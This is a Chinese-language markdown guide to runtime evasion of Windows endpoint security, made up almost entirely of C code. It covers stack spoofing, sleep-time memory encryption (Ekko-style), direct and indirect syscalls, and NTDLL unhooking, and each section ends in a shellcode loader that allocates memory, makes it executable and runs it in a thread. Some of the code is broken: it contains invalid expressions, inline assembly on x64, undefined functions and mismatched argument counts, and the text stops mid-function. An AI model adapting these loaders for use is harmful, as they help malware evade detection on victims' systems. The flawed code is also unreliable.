# 动态对抗 (Dynamic/Runtime Evasion)

## 内存扫描规避

### 堆栈欺骗 (Stack Spoofing)

#### 基础堆栈欺骗
```c
// stack_spoofing.c
#include <windows.h>
#include <stdio.h>
#include <intrin.h>

#pragma intrinsic(_ReturnAddress)

// 伪造的返回地址
void fake_return_address() {
    printf("This is a legitimate function\n");
}

// 堆栈帧欺骗
typedef struct _FAKE_STACK_FRAME {
    PVOID ReturnAddress;
    PVOID Param1;
    PVOID Param2;
    PVOID Param3;
    PVOID Param4;
} FAKE_STACK_FRAME, *PFAKE_STACK_FRAME;

// 设置假堆栈帧
void setup_fake_stack_frame(PFAKE_STACK_FRAME fake_frame) {
    fake_frame->ReturnAddress = (PVOID)fake_return_address;
    fake_frame->Param1 = (PVOID)0x12345678;
    fake_frame->Param2 = (PVOID)0x87654321;
    fake_frame->Param3 = (PVOID)0x11111111;
    fake_frame->Param4 = (PVOID)0x22222222;
}

// 内联汇编实现堆栈欺骗
#ifdef _WIN64
void execute_with_fake_stack(PVOID shellcode, SIZE_T shellcode_size) {
    // 分配内存用于假堆栈
    PFAKE_STACK_FRAME fake_stack = (PFAKE_STACK_FRAME)VirtualAlloc(NULL, 
        sizeof(FAKE_STACK_FRAME) + shellcode_size + 0x1000, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (fake_stack == NULL) return;
    
    // 设置假堆栈帧
    setup_fake_stack_frame(fake_stack);
    
    // 复制shellcode到分配的内存
    PVOID shellcode_addr = (PBYTE)fake_stack + sizeof(FAKE_STACK_FRAME) + 0x100;
    memcpy(shellcode_addr, shellcode, shellcode_size);
    
    // 修改内存保护为可执行
    DWORD old_protect;
    VirtualProtect(shellcode_addr, shellcode_size, PAGE_EXECUTE_READ, &old_protect);
    
    // 使用内联汇编设置假堆栈并执行shellcode
    __asm {
        // 保存当前寄存器
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push rbp
        push rsp
        
        // 设置假堆栈指针
        lea rsp, fake_stack
        
        // 调用shellcode
        call shellcode_addr
        
        // 恢复原始堆栈
        pop rsp
        pop rbp
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
    }
    
    VirtualFree(fake_stack, 0, MEM_RELEASE);
}
#else
void execute_with_fake_stack(PVOID shellcode, SIZE_T shellcode_size) {
    // 32位实现
    PFAKE_STACK_FRAME fake_stack = (PFAKE_STACK_FRAME)VirtualAlloc(NULL, 
        sizeof(FAKE_STACK_FRAME) + shellcode_size + 0x1000, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (fake_stack == NULL) return;
    
    setup_fake_stack_frame(fake_stack);
    
    PVOID shellcode_addr = (PBYTE)fake_stack + sizeof(FAKE_STACK_FRAME) + 0x100;
    memcpy(shellcode_addr, shellcode, shellcode_size);
    
    DWORD old_protect;
    VirtualProtect(shellcode_addr, shellcode_size, PAGE_EXECUTE_READ, &old_protect);
    
    __asm {
        pushad
        push esp
        
        // 设置假堆栈
        mov esp, fake_stack
        
        // 执行shellcode
        call shellcode_addr
        
        // 恢复堆栈
        pop esp
        popad
    }
    
    VirtualFree(fake_stack, 0, MEM_RELEASE);
}
#endif
```

#### 高级堆栈欺骗技术
```c
// advanced_stack_spoofing.c
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

// 线程上下文欺骗
typedef struct _THREAD_CONTEXT_SPOOF {
    CONTEXT original_context;
    CONTEXT spoofed_context;
    BOOL is_spoofed;
} THREAD_CONTEXT_SPOOF, *PTHREAD_CONTEXT_SPOOF;

// 获取当前线程上下文
BOOL get_thread_context_spoof(HANDLE hThread, PCONTEXT context) {
    context->ContextFlags = CONTEXT_FULL;
    return GetThreadContext(hThread, context);
}

// 修改返回地址
BOOL spoof_return_address(HANDLE hThread, PVOID fake_return_address) {
    CONTEXT context = {0};
    if (!get_thread_context_spoof(hThread, &context)) {
        return FALSE;
    }
    
#ifdef _WIN64
    // 修改RIP寄存器（返回地址）
    context.Rip = (DWORD64)fake_return_address;
#else
    // 修改EIP寄存器（返回地址）
    context.Eip = (DWORD)fake_return_address;
#endif
    
    return SetThreadContext(hThread, &context);
}

// 创建具有欺骗堆栈的线程
HANDLE create_thread_with_spoofed_stack(LPTHREAD_START_ROUTINE start_address, LPVOID parameter) {
    // 分配内存用于线程堆栈
    SIZE_T stack_size = 0x10000; // 64KB
    PVOID stack_memory = VirtualAlloc(NULL, stack_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (stack_memory == NULL) return NULL;
    
    // 设置假堆栈帧
    PBYTE stack_top = (PBYTE)stack_memory + stack_size;
    
    // 创建假的返回地址链
    PDWORD64 fake_frame = (PDWORD64)(stack_top - 0x100);
    
    // 设置假的返回地址（合法函数）
    fake_frame[0] = (DWORD64)ExitThread; // 返回地址
    fake_frame[1] = 0; // 参数
    
    // 修改内存保护为可执行
    DWORD old_protect;
    VirtualProtect(stack_memory, stack_size, PAGE_EXECUTE_READWRITE, &old_protect);
    
    // 创建挂起的线程
    HANDLE hThread = CreateThread(NULL, 0, start_address, parameter, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        VirtualFree(stack_memory, 0, MEM_RELEASE);
        return NULL;
    }
    
    // 修改线程上下文以使用假堆栈
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_FULL;
    
    if (GetThreadContext(hThread, &context)) {
#ifdef _WIN64
        context.Rsp = (DWORD64)fake_frame;
        context.Rbp = (DWORD64)fake_frame;
#else
        context.Esp = (DWORD)fake_frame;
        context.Ebp = (DWORD)fake_frame;
#endif
        
        SetThreadContext(hThread, &context);
    }
    
    // 恢复线程执行
    ResumeThread(hThread);
    
    return hThread;
}

// 动态堆栈欺骗
void dynamic_stack_spoofing(PVOID shellcode, SIZE_T shellcode_size) {
    // 获取当前线程句柄
    HANDLE hThread = GetCurrentThread();
    
    // 创建合法的返回地址数组
    PVOID legitimate_functions[] = {
        (PVOID)kernel32.dll!Sleep,
        (PVOID)kernel32.dll!GetTickCount,
        (PVOID)kernel32.dll!GetCurrentProcessId,
        (PVOID)kernel32.dll!GetCurrentThreadId
    };
    
    // 随机选择合法的返回地址
    srand(GetTickCount());
    PVOID fake_return = legitimate_functions[rand() % 4];
    
    // 修改返回地址
    if (spoof_return_address(hThread, fake_return)) {
        printf("Stack spoofed successfully\n");
        
        // 执行shellcode
        ((void(*)())shellcode)();
    }
}
```

### 内存加密 (Sleep Obfuscation/Ekko)

#### 内存加密基础实现
```c
// memory_encryption.c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

// AES内存加密
typedef struct _MEMORY_ENCRYPTION {
    HCRYPTPROV hProvider;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    BYTE* encrypted_memory;
    SIZE_T memory_size;
} MEMORY_ENCRYPTION, *PMEMORY_ENCRYPTION;

// 初始化内存加密
BOOL init_memory_encryption(PMEMORY_ENCRYPTION mem_enc, const char* password) {
    // 获取加密服务提供者
    if (!CryptAcquireContext(&mem_enc->hProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // 创建哈希对象
    if (!CryptCreateHash(mem_enc->hProvider, CALG_SHA_256, 0, 0, &mem_enc->hHash)) {
        CryptReleaseContext(mem_enc->hProvider, 0);
        return FALSE;
    }
    
    // 哈希密码
    if (!CryptHashData(mem_enc->hHash, (BYTE*)password, strlen(password), 0)) {
        CryptDestroyHash(mem_enc->hHash);
        CryptReleaseContext(mem_enc->hProvider, 0);
        return FALSE;
    }
    
    // 生成AES密钥
    if (!CryptDeriveKey(mem_enc->hProvider, CALG_AES_256, mem_enc->hHash, 0, &mem_enc->hKey)) {
        CryptDestroyHash(mem_enc->hHash);
        CryptReleaseContext(mem_enc->hProvider, 0);
        return FALSE;
    }
    
    return TRUE;
}

// 加密内存区域
BOOL encrypt_memory_region(PMEMORY_ENCRYPTION mem_enc, PVOID memory, SIZE_T size) {
    // 分配临时缓冲区
    BYTE* temp_buffer = (BYTE*)malloc(size);
    if (temp_buffer == NULL) return FALSE;
    
    // 复制内存内容
    memcpy(temp_buffer, memory, size);
    
    // 加密数据
    DWORD encrypted_size = size;
    if (!CryptEncrypt(mem_enc->hKey, 0, TRUE, 0, temp_buffer, &encrypted_size, size)) {
        free(temp_buffer);
        return FALSE;
    }
    
    // 复制回原始内存
    memcpy(memory, temp_buffer, encrypted_size);
    free(temp_buffer);
    
    return TRUE;
}

// 解密内存区域
BOOL decrypt_memory_region(PMEMORY_ENCRYPTION mem_enc, PVOID memory, SIZE_T size) {
    // 分配临时缓冲区
    BYTE* temp_buffer = (BYTE*)malloc(size);
    if (temp_buffer == NULL) return FALSE;
    
    // 复制内存内容
    memcpy(temp_buffer, memory, size);
    
    // 解密数据
    DWORD decrypted_size = size;
    if (!CryptDecrypt(mem_enc->hKey, 0, TRUE, 0, temp_buffer, &decrypted_size)) {
        free(temp_buffer);
        return FALSE;
    }
    
    // 复制回原始内存
    memcpy(memory, temp_buffer, decrypted_size);
    free(temp_buffer);
    
    return TRUE;
}

// 睡眠加密实现
void sleep_encrypted(PVOID shellcode, SIZE_T shellcode_size, DWORD sleep_time) {
    MEMORY_ENCRYPTION mem_enc = {0};
    
    // 初始化加密
    if (!init_memory_encryption(&mem_enc, "MySecretPassword123")) {
        return;
    }
    
    // 加密shellcode内存
    if (encrypt_memory_region(&mem_enc, shellcode, shellcode_size)) {
        printf("Memory encrypted successfully\n");
        
        // 修改内存保护为不可执行
        DWORD old_protect;
        VirtualProtect(shellcode, shellcode_size, PAGE_NOACCESS, &old_protect);
        
        // 睡眠
        Sleep(sleep_time);
        
        // 恢复内存保护
        VirtualProtect(shellcode, shellcode_size, old_protect, &old_protect);
        
        // 解密内存
        decrypt_memory_region(&mem_enc, shellcode, shellcode_size);
        printf("Memory decrypted successfully\n");
    }
    
    // 清理
    CryptDestroyKey(mem_enc.hKey);
    CryptDestroyHash(mem_enc.hHash);
    CryptReleaseContext(mem_enc.hProvider, 0);
}
```

#### Ekko内存保护技术
```c
// ekko_protection.c
#include <windows.h>
#include <stdio.h>

typedef struct _EKKO_CONTEXT {
    PVOID image_base;
    SIZE_T image_size;
    PVOID encrypted_base;
    BYTE* key;
    SIZE_T key_size;
    HANDLE hTimer;
    HANDLE hQueue;
    PTIMERAPCROUTINE timer_routine;
} EKKO_CONTEXT, *PEKKO_CONTEXT;

// 定时器回调函数
VOID CALLBACK EkkoTimerCallback(PVOID lpParam, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
    PEKKO_CONTEXT ctx = (PEKKO_CONTEXT)lpParam;
    
    // 加密/解密内存
    static BOOL is_encrypted = FALSE;
    
    if (!is_encrypted) {
        // 加密内存
        DWORD old_protect;
        VirtualProtect(ctx->image_base, ctx->image_size, PAGE_READWRITE, &old_protect);
        
        // 简单的XOR加密
        for (SIZE_T i = 0; i < ctx->image_size; i++) {
            ((BYTE*)ctx->image_base)[i] ^= ctx->key[i % ctx->key_size];
        }
        
        VirtualProtect(ctx->image_base, ctx->image_size, PAGE_NOACCESS, &old_protect);
        is_encrypted = TRUE;
    } else {
        // 解密内存
        DWORD old_protect;
        VirtualProtect(ctx->image_base, ctx->image_size, PAGE_READWRITE, &old_protect);
        
        // 解密
        for (SIZE_T i = 0; i < ctx->image_size; i++) {
            ((BYTE*)ctx->image_base)[i] ^= ctx->key[i % ctx->key_size];
        }
        
        VirtualProtect(ctx->image_base, ctx->image_size, PAGE_EXECUTE_READWRITE, &old_protect);
        is_encrypted = FALSE;
    }
}

// 初始化Ekko保护
BOOL init_ekko_protection(PEKKO_CONTEXT ctx, PVOID image_base, SIZE_T image_size) {
    ctx->image_base = image_base;
    ctx->image_size = image_size;
    ctx->key = (BYTE*)"ThisIsASecretKeyForEncryption123";
    ctx->key_size = 32;
    ctx->timer_routine = EkkoTimerCallback;
    
    // 创建定时器队列
    ctx->hQueue = CreateTimerQueue();
    if (ctx->hQueue == NULL) {
        return FALSE;
    }
    
    return TRUE;
}

// 启动Ekko保护
BOOL start_ekko_protection(PEKKO_CONTEXT ctx, DWORD period_ms) {
    // 创建周期性定时器
    if (!CreateTimerQueueTimer(&ctx->hTimer, ctx->hQueue, ctx->timer_routine, ctx, 
                              period_ms, period_ms, WT_EXECUTEDEFAULT)) {
        return FALSE;
    }
    
    return TRUE;
}

// 停止Ekko保护
BOOL stop_ekko_protection(PEKKO_CONTEXT ctx) {
    if (ctx->hTimer) {
        DeleteTimerQueueTimer(ctx->hQueue, ctx->hTimer, INVALID_HANDLE_VALUE);
    }
    
    if (ctx->hQueue) {
        DeleteTimerQueue(ctx->hQueue);
    }
    
    return TRUE;
}

// 使用Ekko保护执行shellcode
void execute_with_ekko(PVOID shellcode, SIZE_T shellcode_size) {
    EKKO_CONTEXT ekko_ctx = {0};
    
    // 初始化Ekko保护
    if (init_ekko_protection(&ekko_ctx, shellcode, shellcode_size)) {
        printf("Ekko protection initialized\n");
        
        // 启动保护（每5秒切换一次）
        if (start_ekko_protection(&ekko_ctx, 5000)) {
            printf("Ekko protection started\n");
            
            // 执行shellcode
            ((void(*)())shellcode)();
            
            // 停止保护
            stop_ekko_protection(&ekko_ctx);
            printf("Ekko protection stopped\n");
        }
    }
}
```

---

## API Hooking绕过

### 直接系统调用 (Direct Syscalls)

#### x64系统调用实现
```c
// direct_syscalls.c
#include <windows.h>
#include <stdio.h>

// 系统调用号定义（Windows 10 20H2）
#define SYSCALL_NTALLOCATEVIRTUALMEMORY 0x0018
#define SYSCALL_NTPROTECTVIRTUALMEMORY  0x0050
#define SYSCALL_NTCREATETHREADEX         0x00C1

// 系统调用结构
typedef struct _SYSCALL_INFO {
    DWORD syscall_number;
    PVOID syscall_instruction;
} SYSCALL_INFO, *PSYSCALL_INFO;

// 获取系统调用指令地址
PVOID get_syscall_instruction(DWORD syscall_number) {
    // 从ntdll.dll中获取系统调用指令
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return NULL;
    
    // 获取NtAllocateVirtualMemory的地址
    PVOID nt_allocate_vm = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    if (nt_allocate_vm == NULL) return NULL;
    
    // 搜索syscall指令
    PBYTE instruction = (PBYTE)nt_allocate_vm;
    
    // 查找mov eax, syscall_number
    for (int i = 0; i < 20; i++) {
        if (instruction[i] == 0xB8) { // mov eax, imm32
            DWORD current_syscall = *(DWORD*)(instruction + i + 1);
            if (current_syscall == syscall_number) {
                // 查找syscall指令
                for (int j = i + 5; j < i + 20; j++) {
                    if (instruction[j] == 0x0F && instruction[j + 1] == 0x05) {
                        return instruction + j;
                    }
                }
            }
        }
    }
    
    return NULL;
}

// 直接系统调用 - NtAllocateVirtualMemory
NTSTATUS direct_syscall_ntallocatevirtualmemory(
    HANDLE process_handle,
    PVOID* base_address,
    ULONG_PTR zero_bits,
    PSIZE_T region_size,
    ULONG allocation_type,
    ULONG protect
) {
    NTSTATUS status;
    
#ifdef _WIN64
    // x64 系统调用约定
    __asm {
        // 设置参数
        mov r10, rcx
        mov eax, SYSCALL_NTALLOCATEVIRTUALMEMORY
        
        // 系统调用
        syscall
        
        // 保存返回值
        mov status, eax
    }
#else
    // x86 系统调用约定
    __asm {
        // 设置参数
        push protect
        push allocation_type
        push region_size
        push zero_bits
        push base_address
        push process_handle
        
        // 系统调用
        mov eax, SYSCALL_NTALLOCATEVIRTUALMEMORY
        mov edx, 0x7FFE0000  // KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        
        // 清理堆栈
        add esp, 24
        
        // 保存返回值
        mov status, eax
    }
#endif
    
    return status;
}

// 使用直接系统调用执行shellcode
void execute_shellcode_with_syscalls(unsigned char* shellcode, size_t shellcode_size) {
    PVOID allocated_memory = NULL;
    SIZE_T memory_size = shellcode_size;
    
    // 使用直接系统调用分配内存
    NTSTATUS status = direct_syscall_ntallocatevirtualmemory(
        GetCurrentProcess(),
        &allocated_memory,
        0,
        &memory_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to allocate memory: 0x%X\n", status);
        return;
    }
    
    // 复制shellcode
    memcpy(allocated_memory, shellcode, shellcode_size);
    
    // 修改内存保护为可执行
    ULONG old_protect;
    status = direct_syscall_ntprotectvirtualmemory(
        GetCurrentProcess(),
        &allocated_memory,
        &memory_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to change memory protection: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return;
    }
    
    // 使用直接系统调用创建线程
    HANDLE hThread;
    status = direct_syscall_ntcreatethreadex(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        allocated_memory,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to create thread: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return;
    }
    
    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_memory, 0, MEM_RELEASE);
}
```

#### 间接系统调用实现
```c
// indirect_syscalls.c
#include <windows.h>
#include <stdio.h>

// 间接系统调用结构
typedef struct _INDIRECT_SYSCALL {
    PVOID syscall_address;
    DWORD syscall_number;
} INDIRECT_SYSCALL, *PINDIRECT_SYSCALL;

// 初始化间接系统调用
BOOL init_indirect_syscalls() {
    // 从ntdll.dll中获取系统调用地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return FALSE;
    
    // 获取系统调用地址
    PVOID nt_allocate_vm = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    PVOID nt_protect_vm = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    PVOID nt_create_thread = GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    // 验证这些地址是否包含syscall指令
    if (nt_allocate_vm && nt_protect_vm && nt_create_thread) {
        // 检查syscall指令
        if (((PBYTE)nt_allocate_vm)[0] == 0x4C && ((PBYTE)nt_allocate_vm)[1] == 0x8B && 
            ((PBYTE)nt_allocate_vm)[3] == 0xB8 && ((PBYTE)nt_allocate_vm)[18] == 0x0F && 
            ((PBYTE)nt_allocate_vm)[19] == 0x05) {
            printf("Indirect syscalls initialized successfully\n");
            return TRUE;
        }
    }
    
    return FALSE;
}

// 间接系统调用执行器
typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (WINAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// 使用间接系统调用执行shellcode
void execute_shellcode_indirect(unsigned char* shellcode, size_t shellcode_size) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return;
    
    // 获取系统调用函数指针
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    PVOID allocated_memory = NULL;
    SIZE_T memory_size = shellcode_size;
    ULONG old_protect;
    HANDLE hThread;
    
    // 使用间接系统调用分配内存
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &allocated_memory,
        0,
        &memory_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to allocate memory: 0x%X\n", status);
        return;
    }
    
    // 复制shellcode
    memcpy(allocated_memory, shellcode, shellcode_size);
    
    // 使用间接系统调用修改内存保护
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &allocated_memory,
        &memory_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to change memory protection: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return;
    }
    
    // 使用间接系统调用创建线程
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        allocated_memory,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to create thread: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return;
    }
    
    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_memory, 0, MEM_RELEASE);
}
```

### 间接系统调用 (Indirect Syscalls)

#### 动态系统调用解析
```c
// dynamic_syscall_resolver.c
#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_ENTRY {
    DWORD number;
    PVOID address;
    char name[64];
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// 系统调用解析器
typedef struct _SYSCALL_RESOLVER {
    SYSCALL_ENTRY* entries;
    DWORD entry_count;
    HMODULE hNtdll;
} SYSCALL_RESOLVER, *PSYSCALL_RESOLVER;

// 初始化系统调用解析器
BOOL init_syscall_resolver(PSYSCALL_RESOLVER resolver) {
    resolver->hNtdll = GetModuleHandleA("ntdll.dll");
    if (resolver->hNtdll == NULL) return FALSE;
    
    // 分配系统调用条目数组
    resolver->entry_count = 100; // 假设最多100个系统调用
    resolver->entries = (SYSCALL_ENTRY*)calloc(resolver->entry_count, sizeof(SYSCALL_ENTRY));
    if (resolver->entries == NULL) return FALSE;
    
    return TRUE;
}

// 解析单个系统调用
BOOL resolve_syscall(PSYSCALL_RESOLVER resolver, const char* syscall_name, PSYSCALL_ENTRY entry) {
    // 获取函数地址
    PVOID function_addr = GetProcAddress(resolver->hNtdll, syscall_name);
    if (function_addr == NULL) return FALSE;
    
    // 解析系统调用号
    PBYTE function_bytes = (PBYTE)function_addr;
    
    // 查找mov eax, syscall_number指令
    for (int i = 0; i < 20; i++) {
        if (function_bytes[i] == 0xB8) { // mov eax, imm32
            DWORD syscall_number = *(DWORD*)(function_bytes + i + 1);
            
            // 查找syscall指令
            for (int j = i + 5; j < i + 20; j++) {
                if (function_bytes[j] == 0x0F && function_bytes[j + 1] == 0x05) {
                    // 找到系统调用地址
                    entry->number = syscall_number;
                    entry->address = function_bytes + j;
                    strcpy(entry->name, syscall_name);
                    return TRUE;
                }
            }
        }
    }
    
    return FALSE;
}

// 执行间接系统调用
NTSTATUS execute_indirect_syscall(PSYSCALL_ENTRY entry, PVOID param1, PVOID param2, PVOID param3, PVOID param4, PVOID param5, PVOID param6) {
    typedef NTSTATUS (WINAPI *pSyscallFunc)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);
    
    // 将系统调用地址转换为函数指针
    pSyscallFunc syscall_func = (pSyscallFunc)entry->address;
    
    // 执行系统调用
    return syscall_func(param1, param2, param3, param4, param5, param6);
}

// 使用动态解析的系统调用执行shellcode
void execute_shellcode_dynamic(PVOID shellcode, SIZE_T shellcode_size) {
    SYSCALL_RESOLVER resolver = {0};
    SYSCALL_ENTRY allocate_entry = {0};
    SYSCALL_ENTRY protect_entry = {0};
    SYSCALL_ENTRY create_thread_entry = {0};
    
    // 初始化解析器
    if (!init_syscall_resolver(&resolver)) {
        printf("Failed to initialize syscall resolver\n");
        return;
    }
    
    // 解析系统调用
    if (!resolve_syscall(&resolver, "NtAllocateVirtualMemory", &allocate_entry) ||
        !resolve_syscall(&resolver, "NtProtectVirtualMemory", &protect_entry) ||
        !resolve_syscall(&resolver, "NtCreateThreadEx", &create_thread_entry)) {
        printf("Failed to resolve syscalls\n");
        free(resolver.entries);
        return;
    }
    
    PVOID allocated_memory = NULL;
    SIZE_T memory_size = shellcode_size;
    ULONG old_protect;
    HANDLE hThread;
    
    // 使用动态解析的系统调用分配内存
    NTSTATUS status = execute_indirect_syscall(&allocate_entry,
        GetCurrentProcess(),
        &allocated_memory,
        0,
        &memory_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to allocate memory: 0x%X\n", status);
        free(resolver.entries);
        return;
    }
    
    // 复制shellcode
    memcpy(allocated_memory, shellcode, shellcode_size);
    
    // 修改内存保护
    status = execute_indirect_syscall(&protect_entry,
        GetCurrentProcess(),
        &allocated_memory,
        &memory_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to change memory protection: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        free(resolver.entries);
        return;
    }
    
    // 创建线程
    status = execute_indirect_syscall(&create_thread_entry,
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        allocated_memory,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        printf("Failed to create thread: 0x%X\n", status);
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        free(resolver.entries);
        return;
    }
    
    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_memory, 0, MEM_RELEASE);
    free(resolver.entries);
}
```

### Unhooking技术

#### NTDLL unhooking
```c
// unhooking.c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// 从磁盘重新加载ntdll.dll
BOOL unhook_ntdll() {
    // 获取当前ntdll.dll的句柄
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return FALSE;
    
    // 获取ntdll.dll的文件路径
    char ntdll_path[MAX_PATH];
    GetSystemDirectoryA(ntdll_path, MAX_PATH);
    strcat(ntdll_path, "\\ntdll.dll");
    
    // 从磁盘重新加载ntdll.dll
    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* file_buffer = (BYTE*)malloc(file_size);
    if (file_buffer == NULL) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    DWORD bytes_read;
    if (!ReadFile(hFile, file_buffer, file_size, &bytes_read, NULL)) {
        free(file_buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    
    // 解析PE文件
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_buffer;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(file_buffer + dos_header->e_lfanew);
    
    // 获取.text节的信息
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (memcmp(section_header[i].Name, ".text", 5) == 0) {
            // 找到.text节
            BYTE* original_text_section = file_buffer + section_header[i].PointerToRawData;
            PVOID current_text_section = (PBYTE)hNtdll + section_header[i].VirtualAddress;
            
            // 修改内存保护
            DWORD old_protect;
            if (VirtualProtect(current_text_section, section_header[i].Misc.VirtualSize, 
                              PAGE_EXECUTE_READWRITE, &old_protect)) {
                
                // 复制原始的.text节
                memcpy(current_text_section, original_text_section, section_header[i].Misc.VirtualSize);
                
                // 恢复内存保护
                VirtualProtect(current_text_section, section_header[i].Misc.VirtualSize, 
                              old_protect, &old_protect);
                
                printf("NTDLL unhooked successfully\n");
                free(file_buffer);
                return TRUE;
            }
        }
    }
    
    free(file_buffer);
    return FALSE;
}

// 检测钩子
BOOL detect_hooks(HMODULE hModule, const char* function_name) {
    PVOID function_addr = GetProcAddress(hModule, function_name);
    if (function_addr == NULL) return FALSE;
    
    PBYTE function_bytes = (PBYTE)function_addr;
    
    // 检查前几个字节是否包含跳转指令
    if (function_bytes[0] == 0xE9 || // jmp rel32
        function_bytes[0] == 0xEB || // jmp rel8
        (function_bytes[0] == 0xFF && function_bytes[1] == 0x25) || // jmp [rip+rel32]
        (function_bytes[0] == 0x48 && function_bytes[1] == 0xB8)) { // mov rax, imm64
        printf("Hook detected in %s\n", function_name);
        return TRUE;
    }
    
    // 检查是否包含syscall指令
    BOOL has_syscall = FALSE;
    for (int i = 0; i < 50; i++) {
        if (function_bytes[i] == 0x0F && function_bytes[i + 1] == 0x05) {
            has_syscall = TRUE;
            break;
        }
    }
    
    if (!has_syscall) {
        printf("Syscall instruction not found in %s (possible hook)\n", function_name);
        return TRUE;
    }
    
    return FALSE;
}

// 使用直接系统调用来绕过钩子
BOOL execute_with_direct_syscalls(unsigned char* shellcode, size_t shellcode_size) {
    // 首先取消ntdll.dll的钩子
    if (!unhook_ntdll()) {
        printf("Failed to unhook ntdll.dll\n");
        return FALSE;
    }
    
    // 检测关键函数是否还有钩子
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
